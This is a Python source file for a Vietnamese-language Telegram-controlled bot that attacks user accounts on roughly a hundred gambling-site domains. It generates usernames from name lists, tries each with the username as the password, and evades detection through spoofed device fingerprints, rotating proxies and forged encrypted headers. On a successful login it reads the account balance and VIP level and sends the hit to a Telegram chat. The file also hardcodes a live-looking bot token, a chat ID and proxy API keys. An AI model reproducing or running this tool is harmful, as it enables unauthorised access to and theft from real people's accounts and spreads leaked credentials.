import os
import sys
import time
import uuid
import base64
import random
import hashlib
import secrets
import threading
import json
import re
import asyncio
from queue import Queue, Empty
from typing import Optional, Dict, Any, List, Tuple
import requests

from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ============ CONFIG & DOMAINS FILE ============
DOMAINS_FILE = "domains.json"
INVALID_DOMAINS_FILE = "invalid_domains.json"

DEFAULT_DOMAINS = [
    "m.111pg99.com",
    "m.164789.com",
    "m.16vvvwin.com",
    "m.18win.com",
    "m.190789.com",
    "m.1bmw.com",
    "m.1bmw.me",
    "m.1bmw.tv",
    "m.1pg66.com",
    "m.2026pg66.com",
    "m.202789.com",
    "m.23win.baby",
    "m.23win08.com",
    "m.23win09.com",
    "m.26hello88.com",
    "m.2888.com",
    "m.2pg66.com",
    "m.32win75.com",
    "m.32win76.com",
    "m.32win77.com",
    "m.333pg99.com",
    "m.336049.com",
    "m.43nmvd.com",
    "m.4vipwin.com",
    "m.5ivug.fun",
    "m.5vipwin.com",
    "m.69vn5.com",
    "m.69vn6.com",
    "m.69vn7.com",
    "m.69vn8.com",
    "m.789bettg.net",
    "m.789win0052.com",
    "m.79k09.club",
    "m.79king1.com",
    "m.82king88.com",
    "m.88ck.xyz",
    "m.88ok7.net",
    "m.88vv.my",
    "m.89bet3000.com",
    "m.8k0341q.top",
    "m.8k4028q.top",
    "m.8k438sj.top",
    "m.98wn65.com",
    "m.abc11.ink",
    "m.abc81.store",
    "m.by6yg1.com",
    "m.dpyg3.xyz",
    "m.f8897.vip",
    "m.f8beaa.top",
    "m.f8bet6.chat",
    "m.ffok04.com",
    "m.ffok05.com",
    "m.ffok06.com",
    "m.ffok07.com",
    "m.gjjdhh-235dhdhkk.vip",
    "m.good8812.cc",
    "m.good8813.cc",
    "m.good8814.cc",
    "m.good8815.cc",
    "m.hello66.com",
    "m.hi88208.com",
    "m.hi88278.com",
    "m.hi88298.com",
    "m.hi88xx.com",
    "m.hkt699e.vip",
    "m.hubet59.com",
    "m.j866.ink",
    "m.kardupo.cc",
    "m.kl99.fan",
    "m.kl991.com",
    "m.kuwn42.com",
    "m.kuwn57.com",
    "m.kuwn58.com",
    "m.lomzeti.cc",
    "m.mb6614.run",
    "m.mb66a3.com",
    "m.mmrkb1.com",
    "m.new888e.vip",
    "m.new88pc.com",
    "m.newwa.vip",
    "m.nh113.vip",
    "m.nh114.vip",
    "m.nh225.vip",
    "m.ok36533.vip",
    "m.ok36555.vip",
    "m.ok36556.vip",
    "m.ok36557.vip",
    "m.ok559.cc",
    "m.okking72.com",
    "m.okking91.com",
    "m.okvnd.my",
    "m.pg99066.icu",
    "m.pg99go.com",
    "m.shbe60.net",
    "m.u821.store",
    "m.u888w.click",
    "m.vip32win.club",
    "m.vipwin18.com",
    "m.vipwin19.com",
    "m.vipwin20.com",
    "m.vvvwin04.vip",
    "m.vvvwin05.vip",
    "m.win55mm.com",
    "m.win55mmm.com",
    "m.xin88.xin"
]

domain_lock = threading.Lock()
cache_lock = threading.Lock()
print_lock = threading.Lock()

def load_domains() -> List[str]:
    with domain_lock:
        if os.path.exists(DOMAINS_FILE):
            try:
                with open(DOMAINS_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    if isinstance(data, list) and data:
                        return data
            except Exception:
                pass
    save_domains(DEFAULT_DOMAINS)
    return DEFAULT_DOMAINS

def save_domains(domains: List[str]):
    with domain_lock:
        try:
            with open(DOMAINS_FILE, "w", encoding="utf-8") as f:
                json.dump(domains, f, ensure_ascii=False, indent=4)
        except Exception:
            pass

selected_scan_domains = []

NEST_API_KEY = "63ed0cc2-6d3d-4638-ae19-e1055a00f4e9"
NEST_PROXY_KEY = "UK-b3014e75-d8a1-43d1-88de-36347bd5d954"
NUM_THREADS = 15
PROGRESS_EVERY = 50

DEFAULT_TG_TOKEN = os.getenv("TG_TOKEN", '8945935067:AAE2VDijVUdIM-DYUlmKff2uvWgZBdpgjjI')
DEFAULT_TG_CHAT_ID = os.getenv("TG_CHAT_ID", '7348217229')

is_scanning = False

HO_DEM_KHONG_DAU = [
    "nguyen", "tran", "le", "pham", "hoang", "huynh", "phan", "vu", "vinh", "vo",
    "dang", "bui", "do", "ho", "ngo", "duong", "ly", "an", "bao", "binh",
    "chinh", "cong", "cuong", "dung", "duy", "dai", "dat", "duc", "duong", "giang",
    "hai", "hao", "hieu", "hoa", "hoang", "huy", "hung", "huong", "kha", "khanh",
    "khoa", "kiet", "lam", "linh", "long", "luong", "minh", "nam", "nghia", "nhan",
    "nhat", "phat", "phong", "phuc", "phuong", "quan", "quang", "quynh", "sang", "son",
    "tai", "tam", "tan", "thanh", "thao", "thien", "thinh", "thu", "thuan", "thuong",
    "tien", "toan", "trang", "tri", "triet", "trung", "truong", "tuan", "tung", "uyen",
    "van", "viet", "vinh", "vu", "vy", "bien", "cam", "chau", "chi", "diep", "duyen",
    "hien", "hong", "hue", "lan", "mai", "my", "nga", "ngoc", "nhung"
]

HO_VA_TEN = [
    "anh", "bao", "binh", "chinh", "cong", "cuong", "dung", "duy", "dai", "dat",
    "duc", "dung", "duong", "giang", "hai", "hao", "hieu", "hoa", "hoang", "huy",
    "hung", "huong", "kha", "khanh", "khoa", "kiet", "lam", "linh", "long", "luong",
    "minh", "nam", "nghia", "nhan", "nhat", "phat", "phong", "phuc", "phuong", "quan",
    "quang", "quynh", "sang", "son", "tai", "tam", "tan", "thanh", "thao", "thien",
    "thinh", "thu", "thuan", "thuong", "tien", "toan", "trang", "tri", "triet", "trung",
    "truong", "tuan", "tung", "uyen", "van", "viet", "vinh", "vu", "vinh", "vy",
    "an", "bien", "cam", "chau", "chi", "diep", "dung", "duyen", "giang", "hien",
    "hoa", "hong", "hue", "huong", "khanh", "lan", "linh", "mai", "my", "nga",
    "ngoc", "nhung", "phuong", "quynh", "tam", "thao", "thu", "thuy", "trang", "uyen"
]

class FormStates(StatesGroup):
    waiting_for_range = State()
    waiting_for_confirmation = State()
    waiting_for_new_domain = State()

def generate_txt_file(num_unique_names: int, start_num: int, end_num: int, single_name_mode: bool, selected_names: List[str] = None) -> List[str]:
    lines = []
    try:
        if single_name_mode:
            base_name = selected_names[0] if selected_names else f"{random.choice(HO_DEM_KHONG_DAU)}{random.choice(HO_VA_TEN)}"
            for i in range(start_num, end_num + 1):
                lines.append(f"{base_name}{i}")
        else:
            names_pool = selected_names if selected_names else [f"{random.choice(HO_DEM_KHONG_DAU)}{random.choice(HO_VA_TEN)}" for _ in range(num_unique_names)]
            for name in names_pool:
                for i in range(start_num, end_num + 1):
                    lines.append(f"{name}{i}")

        with open("100.txt", "w", encoding="utf-8") as f:
            for line in lines:
                f.write(f"{line}\n")
        return lines
    except Exception as e:
        print(f"Lỗi tạo file: {e}")
        return []

CACHE_FILE = "endpoint_cache.json"

def load_endpoint_cache() -> dict:
    with cache_lock:
        if os.path.exists(CACHE_FILE):
            try:
                with open(CACHE_FILE, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception:
                pass
        return {}

def save_endpoint_cache(cache: dict):
    with cache_lock:
        try:
            with open(CACHE_FILE, "w", encoding="utf-8") as f:
                json.dump(cache, f, ensure_ascii=False, indent=4)
        except Exception:
            pass

def load_accounts() -> list:
    users = []
    if not os.path.exists("100.txt"):
        generate_txt_file(num_unique_names=5, start_num=1, end_num=200, single_name_mode=False)
    try:
        with open("100.txt", "r", encoding="utf-8", errors="ignore") as f:
            seen = set()
            for line in f:
                line = line.strip()
                if not line: continue
                parts = line.split("|") if "|" in line else line.split(":")
                u = parts[0].strip() if len(parts) >= 2 else line.strip()
                if u and u not in seen:
                    seen.add(u)
                    users.append({"user": u, "pw": u})
    except Exception as e:
        print(f"⚠️ Lỗi đọc file tài khoản: {e}")
    return users

class Col:
    GREEN = "\033[92m"; YELLOW = "\033[93m"; RED = "\033[91m"
    CYAN = "\033[96m"; GOLD = "\033[33;1m"; RESET = "\033[0m"

def log_safe(msg, color=Col.RESET):
    with print_lock:
        print(f"{color}{msg}{Col.RESET}")

def send_telegram(site: str, user: str, balance: str, vip: str, lixi: str, is_big_win: bool, is_high_vip: bool):
    if is_big_win or is_high_vip:
        text = (
            f"🚨 🔥 <b>[HÀNG KHỦNG]</b> 🔥 🚨\n"
            f"🪐 <b>Web:</b> <code>https://{site}</code>\n"
            f"👤 <b>User:</b> <code>{user}</code>\n"
            f"💰 <b>Bal:</b> <b><u>{balance}</u></b> 💥\n"
            f"🎖️ <b>VIP:</b> <b>⭐ {vip} ⭐</b>\n"
            f"🧧 <b>Lì xì:</b> <code>{lixi}</code>"
        )
    else:
        text = (
            f"✨ <b>SAO PHAI XOAN</b> ✨\n"
            f"🪐 <b>Web:</b> <code>https://{site}</code>\n"
            f"👤 <b>User:</b> <code>{user}</code>\n"
            f"💰 <b>Bal:</b> <code>{balance}</code> | 🎖️ <b>VIP:</b> <code>{vip}</code>"
        )
        
    url_send = f"https://api.telegram.org/bot{DEFAULT_TG_TOKEN}/sendMessage"
    payload = {"chat_id": DEFAULT_TG_CHAT_ID, "text": text, "parse_mode": "HTML"}
    
    for _ in range(3):
        try:
            resp = requests.post(url_send, json=payload, timeout=10)
            res_data = resp.json()
            if res_data.get("ok"):
                if is_big_win or is_high_vip:
                    message_id = res_data["result"]["message_id"]
                    url_pin = f"https://api.telegram.org/bot{DEFAULT_TG_TOKEN}/pinChatMessage"
                    try:
                        requests.post(url_pin, json={"chat_id": DEFAULT_TG_CHAT_ID, "message_id": message_id}, timeout=5)
                    except Exception:
                        pass
                break
        except Exception:
            pass
        time.sleep(2)

class AntiDetect:
    _DEVICES = [
        ("Samsung", "SM-S931B", "15", "124.0.6367.82"),
        ("Google", "Pixel 8 Pro", "14", "124.0.6367.82"),
        ("Xiaomi", "23117RK6BC", "14", "124.0.6367.82"),
    ]

    @classmethod
    def generate(cls) -> Dict[str, Any]:
        brand, model, android_ver, chrome_ver = random.choice(cls._DEVICES)
        major_ver = chrome_ver.split(".")[0]
        ua = f"Mozilla/5.0 (Linux; Android {android_ver}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36"
        return {
            "ua": ua, 
            "sec_ch_ua": f'"Not/A)Brand";v="99", "Chromium";v="{major_ver}", "Google Chrome";v="{major_ver}"',
            "device_fp": hashlib.md5(secrets.token_hex(16).encode()).hexdigest(),
        }

# RSA Pure Python Implementation (Lightweight)
N_EXP = 0x10001
N_MOD = int(
    "008271657ea2ad96f4b8b6cd0792893844ad06cdca3508c19fc297c89639ddef"
    "b257d66d7d37c22accdf87cd7dc5332a94e44224cd55aa77d1b5121434cd04be"
    "cdad5d1a80243908e84ab445be849ce5cd5d9d7f0e0d5d713426e950783ac6fb"
    "a672b1d0ad543ee7d4d6cd20d294bc4b407a0058e0545a0050783ac872a8fd", 16
)

def pkcs1_v1_5_pad(data: bytes, target_len: int = 128) -> bytes:
    pad_len = target_len - 3 - len(data)
    padding = bytes([random.randint(1, 255) for _ in range(pad_len)])
    return b"\x00\x02" + padding + b"\x00" + data

def pure_rsa_encrypt(data: bytes) -> bytes:
    out = b""
    for i in range(0, len(data), 117):
        chunk = data[i:i+117]
        padded = pkcs1_v1_5_pad(chunk, 128)
        payload = int.from_bytes(padded, 'big')
        encrypted = pow(payload, N_EXP, N_MOD)
        out += encrypted.to_bytes(128, 'big')
    return out

def make_sec_headers(domain: str, ua: str) -> Dict[str, str]:
    ts = str(int(time.time() * 1000))
    nonce = str(uuid.uuid4())
    raw_data = f"{ts}:{nonce}:{domain}:{ua}".encode("utf-8")
    enc = pure_rsa_encrypt(raw_data)
    return {"x-nonce": nonce, "x-timestamp": ts, "x-sec-data": base64.b64encode(enc).decode()}

class SiteAPI:
    def __init__(self, domain: str, proxy: Optional[str] = None):
        self.domain = domain
        self.profile = AntiDetect.generate()
        self.ua = self.profile["ua"]
        self.fp = self.profile["device_fp"]
        self.auth_token = None
        self.session = requests.Session()
        if proxy:
            p = proxy if "://" in proxy else f"http://{proxy}"
            self.session.proxies = {"http": p, "https": p}
        self.session.headers.update({
            "user-agent": self.ua, 
            "content-type": "application/json;charset=UTF-8",
            "accept": "application/json, text/plain, */*", 
            "referer": f"https://{domain}/", 
            "origin": f"https://{domain}", 
        })
        
        self._warmup_home_page()
        endpoints = self.auto_discover_endpoints()
        if not endpoints:
            raise ValueError(f"Domain {domain} không phản hồi endpoint.")
        self.login_endpoint, self.captcha_endpoint, self.setting_endpoint = endpoints

    def _warmup_home_page(self):
        try:
            self.session.get(f"https://{self.domain}/", timeout=5.0)
        except Exception:
            pass

    def auto_discover_endpoints(self) -> Optional[Tuple[str, str, str]]:
        cache = load_endpoint_cache()
        cached = cache.get(self.domain)
        if cached and isinstance(cached, dict):
            return cached.get("login"), cached.get("captcha"), cached.get("setting")

        found_setting = "/portalApi/1.0/user/loginSetting"
        found_captcha = "/portalApi/1.0/login/captcha"
        found_login = "/portalApi/1.0/login/submit"

        new_cache = load_endpoint_cache()
        new_cache[self.domain] = {"setting": found_setting, "captcha": found_captcha, "login": found_login}
        save_endpoint_cache(new_cache)
        return found_setting, found_captcha, found_login

    def _sec(self) -> Dict[str, str]:
        headers = make_sec_headers(self.domain, self.ua)
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
            headers["token"] = str(self.auth_token)
        return headers

    def get_captcha_login(self) -> Optional[Dict[str, Any]]:
        try:
            r = self.session.get(f"https://{self.domain}{self.captcha_endpoint}", timeout=5.0)
            if r.status_code == 200:
                res = r.json()
                result_obj = res.get("Result") or res.get("Data") or res.get("ReturnObject") or res
                if isinstance(result_obj, dict):
                    img = result_obj.get("Image") or result_obj.get("image")
                    val = result_obj.get("EncryptValue") or result_obj.get("Value") or result_obj.get("value")
                    return {"image": img, "value": val or "", "no_captcha": False}
        except Exception:
            pass
        return {"image": None, "value": "", "no_captcha": True}

    def login(self, user: str, pw: str, code: str = "", enc_val: str = "") -> str:
        body = {
            "account": user, "password": pw, 
            "checkCode": code, "checkCodeEncrypt": enc_val, 
            "fingerprint": self.fp, "usedApp": False
        }
        try:
            r = self.session.post(f"https://{self.domain}{self.login_endpoint}", json=body, headers=self._sec(), timeout=10)
            if r.status_code == 200:
                res = r.json()
                code_val = res.get("Code") or res.get("code")
                if code_val in [200, 0] or res.get("IsSuccess") is True:
                    login_token = res.get("LoginToken") or res.get("Data")
                    if isinstance(login_token, dict):
                        self.auth_token = login_token.get("AccessToken") or login_token.get("token")
                    elif isinstance(login_token, str):
                        self.auth_token = login_token
                    return "SUCCESS"
                return "WRONG_PASS"
        except Exception:
            pass
        return "FAIL"

    def get_balance(self) -> Tuple[str, str]:
        try:
            r = self.session.get(f"https://{self.domain}/api/0.0/Home/get-balance/?app=1", headers=self._sec(), timeout=5)
            if r.status_code == 200:
                res = r.json()
                data = res.get("ReturnObject") or res.get("Data") or res
                if isinstance(data, list) and data: data = data[0]
                if isinstance(data, dict):
                    bal = data.get("Money") or data.get("Balance") or "0"
                    return str(bal), "0"
        except Exception:
            pass
        return "0", "0"

    def get_vip_info(self) -> str:
        try:
            r = self.session.get(f"https://{self.domain}/api/1.0/member/vip/experience?app=1", headers=self._sec(), timeout=5)
            if r.status_code == 200:
                res = r.json()
                data = res.get("ReturnObject") or res.get("Data") or res
                if isinstance(data, dict):
                    return str(data.get("Grade", "0"))
        except Exception:
            pass
        return "0"

    def check_and_claim_lixi(self) -> List[Dict[str, Any]]:
        return []

class ProxyProvider:
    def __init__(self, rotate_interval=300):
        self.proxy = None
        self.lock = threading.Lock()
        self.last_update = 0
        self.cache_time = rotate_interval

    def get_proxy(self, force_refresh=False):
        with self.lock:
            now = time.time()
            if force_refresh or self.proxy is None or (now - self.last_update >= self.cache_time):
                try:
                    r = requests.get("https://nestproxy.com/api/client/proxy/available", params={"proxy_key": NEST_PROXY_KEY}, headers={"user-api-key": NEST_API_KEY}, timeout=5)
                    data = r.json()
                    p = data.get("proxy")
                    if p:
                        self.proxy = p if p.startswith("http") else "http://" + p
                        self.last_update = now
                except Exception:
                    pass
            return self.proxy

def parse_balance(bal_str: str) -> float:
    try: return float(str(bal_str).replace(',', '').strip())
    except: return 0.0

def run_scanner_task(chat_id: int):
    global is_scanning, selected_scan_domains
    is_scanning = True
    accounts = load_accounts()
    domains_to_scan = selected_scan_domains if selected_scan_domains else load_domains()
        
    if not domains_to_scan:
        log_safe("⚠️ Chưa chọn domain nào để quét!", Col.RED)
        return

    total_tasks = len(accounts) * len(domains_to_scan)
    log_safe(f"🚀 Quét {len(accounts)} tài khoản x {len(domains_to_scan)} domains (Tổng: {total_tasks:,})...", Col.GOLD)
    
    task_queue = Queue()
    for a in accounts:
        for domain in domains_to_scan:
            task_queue.put((a, domain))

    completed_count = 0
    success_count = 0
    wrong_pass_count = 0
    other_fail_count = 0
    
    count_lock = threading.Lock()
    proxy_provider = ProxyProvider(rotate_interval=60)

    def worker():
        nonlocal completed_count, success_count, wrong_pass_count, other_fail_count
        while is_scanning:
            try:
                acc, domain = task_queue.get(timeout=1)
            except Empty:
                break

            res = "FAIL"
            proxy = proxy_provider.get_proxy()
            try:
                api = SiteAPI(domain, proxy)
                cap_data = api.get_captcha_login()
                res = api.login(acc['user'], acc['pw'], "", cap_data.get('value', ''))
            except Exception:
                res = "FAIL"

            with count_lock:
                completed_count += 1
                if res == "SUCCESS": success_count += 1
                elif res == "WRONG_PASS": wrong_pass_count += 1
                else: other_fail_count += 1
                    
                curr_completed = completed_count
                curr_success = success_count

            if res == "SUCCESS":
                try:
                    balance, _ = api.get_balance()
                    vip = api.get_vip_info()
                    bal_num = parse_balance(balance)
                    log_safe(f"[SUCCESS] {domain} | {acc['user']} | Bal: {balance} | VIP: {vip}", Col.GREEN)
                    send_telegram(domain, acc['user'], balance, f"VIP {vip}", "Không", bal_num > 10, int(vip) >= 5 if vip.isdigit() else False)
                except Exception:
                    pass

            if curr_completed % PROGRESS_EVERY == 0 or curr_completed == total_tasks:
                log_safe(f"[TIẾN ĐỘ] Hoàn thành: {curr_completed:,}/{total_tasks:,} | Trúng: {curr_success}", Col.CYAN)

            task_queue.task_done()

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(NUM_THREADS)]
    for t in threads: t.start()
    for t in threads: t.join()

    is_scanning = False
    log_safe("✅ Quét hoàn tất!", Col.GREEN)
    try:
        requests.post(f"https://api.telegram.org/bot{DEFAULT_TG_TOKEN}/sendMessage", json={"chat_id": chat_id, "text": "✅ Quá trình quét hoàn tất!"}, timeout=5)
    except Exception:
        pass

# ============ TELEGRAM BOT HANDLERS ============
telegram_bot = Bot(token=DEFAULT_TG_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    builder = InlineKeyboardBuilder()
    builder.button(text="⚙️ Tạo danh sách tên ngẫu nhiên mới", callback_data="config_gen")
    builder.button(text="🌐 Chọn Domain quét", callback_data="config_domains")
    builder.button(text="➕ Thêm Domain mới", callback_data="add_domain_prompt")
    builder.button(text="🚀 Bắt đầu quét", callback_data="start_scan")
    builder.button(text="⏹ Dừng lại", callback_data="stop_scan")
    builder.adjust(1)
    
    await message.answer("🤖 **BẢNG ĐIỀU KHIỂN TOOL QUÉT TÀI KHOẢN**\n\nChọn chức năng bên dưới:", reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(lambda c: c.data == "config_domains")
async def cb_config_domains(callback: types.CallbackQuery):
    await callback.answer()
    domains = load_domains()
    global selected_scan_domains
    if not selected_scan_domains: selected_scan_domains = list(domains)

    builder = InlineKeyboardBuilder()
    for idx, domain in enumerate(domains):
        icon = "✓" if domain in selected_scan_domains else "·"
        builder.button(text=f"{icon} {domain.replace('m.', '')}", callback_data=f"toggle_domain_{idx}")
    
    builder.adjust(3)
    builder.row(types.InlineKeyboardButton(text="☑️ Chọn tất cả", callback_data="domain_select_all"), types.InlineKeyboardButton(text="❌ Bỏ chọn hết", callback_data="domain_unselect_all"))
    builder.row(types.InlineKeyboardButton(text="➕ Thêm Domain", callback_data="add_domain_prompt"), types.InlineKeyboardButton(text="💾 Lưu & Thoát", callback_data="back_home"))

    await callback.message.edit_text(f"🌐 **QUẢN LÝ DOMAIN** ({len(selected_scan_domains)}/{len(domains)})", reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(lambda c: c.data.startswith("toggle_domain_"))
async def cb_toggle_domain(callback: types.CallbackQuery):
    await callback.answer()
    idx = int(callback.data.split("_")[2])
    domains = load_domains()
    global selected_scan_domains
    if idx < len(domains):
        d = domains[idx]
        if d in selected_scan_domains: selected_scan_domains.remove(d)
        else: selected_scan_domains.append(d)
    await cb_config_domains(callback)

@dp.callback_query(lambda c: c.data == "domain_select_all")
async def cb_domain_select_all(callback: types.CallbackQuery):
    global selected_scan_domains
    selected_scan_domains = list(load_domains())
    await cb_config_domains(callback)

@dp.callback_query(lambda c: c.data == "domain_unselect_all")
async def cb_domain_unselect_all(callback: types.CallbackQuery):
    global selected_scan_domains
    selected_scan_domains = []
    await cb_config_domains(callback)

@dp.callback_query(lambda c: c.data == "add_domain_prompt")
async def cb_add_domain_prompt(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.set_state(FormStates.waiting_for_new_domain)
    await callback.message.answer("➕ Nhập tên miền mới (Ví dụ: `m.domainmoi.com`)", parse_mode="Markdown")

@dp.message(FormStates.waiting_for_new_domain)
async def process_new_domain(message: types.Message, state: FSMContext):
    text = message.text.strip().lower().replace("https://", "").replace("http://", "").split("/")[0]
    domains = load_domains()
    if text and text not in domains:
        domains.append(text)
        save_domains(domains)
        await message.answer(f"✅ Đã thêm domain: `{text}`", parse_mode="Markdown")
    await state.clear()

@dp.callback_query(lambda c: c.data == "back_home")
async def cb_back_home(callback: types.CallbackQuery):
    await cmd_start(callback.message)

@dp.callback_query(lambda c: c.data == "config_gen")
async def cb_config_gen(callback: types.CallbackQuery):
    await callback.answer()
    builder = InlineKeyboardBuilder()
    builder.button(text="📌 Kiểu 1: Cố định 1 tên", callback_data="mode_single_name")
    builder.button(text="🔀 Kiểu 2: Nhiều tên khác nhau", callback_data="mode_multi_name")
    builder.adjust(1)
    await callback.message.answer("📝 Chọn kiểu tạo tên:", reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(lambda c: c.data in ["mode_single_name", "mode_multi_name"])
async def cb_select_mode(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    is_single = (callback.data == "mode_single_name")
    await state.update_data(single_name_mode=is_single)
    await state.set_state(FormStates.waiting_for_range)
    msg = "Nhập dải số (VD: `1-1000`):" if is_single else "Nhập số lượng & dải số (VD: `5 1-200`):"
    await callback.message.answer(f"📝 {msg}", parse_mode="Markdown")

@dp.message(FormStates.waiting_for_range)
async def process_custom_range(message: types.Message, state: FSMContext):
    text = message.text.strip()
    data = await state.get_data()
    single_mode = data.get("single_name_mode", False)
    
    if single_mode:
        m = re.match(r"^(\d+)\s*-\s*(\d+)$", text)
        if not m: return await message.answer("❌ Định dạng sai! VD: `1-1000`")
        num_u, start_n, end_n = 1, int(m.group(1)), int(m.group(2))
    else:
        m = re.match(r"^(\d+)\s+(\d+)\s*-\s*(\d+)$", text)
        if not m: return await message.answer("❌ Định dạng sai! VD: `5 1-200`")
        num_u, start_n, end_n = int(m.group(1)), int(m.group(2)), int(m.group(3))

    selected_names = [f"{random.choice(HO_DEM_KHONG_DAU)}{random.choice(HO_VA_TEN)}" for _ in range(num_u)]
    lines = generate_txt_file(num_u, start_n, end_n, single_mode, selected_names)
    await state.clear()
    await message.answer(f"✅ Đã lưu {len(lines):,} dòng vào file `100.txt`!", parse_mode="Markdown")

@dp.callback_query(lambda c: c.data == "start_scan")
async def cb_start_scan(callback: types.CallbackQuery):
    await callback.answer()
    global is_scanning
    if is_scanning: return await callback.message.answer("⚠️ Bot đang chạy!")
    threading.Thread(target=run_scanner_task, args=(callback.message.chat.id,), daemon=True).start()
    await callback.message.answer("🚀 **Đã bắt đầu quét!**", parse_mode="Markdown")

@dp.callback_query(lambda c: c.data == "stop_scan")
async def cb_stop_scan(callback: types.CallbackQuery):
    await callback.answer()
    global is_scanning
    is_scanning = False
    await callback.message.answer("⏹ **Đã gửi lệnh dừng.**", parse_mode="Markdown")

async def main():
    log_safe("🤖 Bot sẵn sàng hoạt động trên Railway...", Col.GOLD)
    await dp.start_polling(telegram_bot)

if __name__ == "__main__":
    asyncio.run(main())
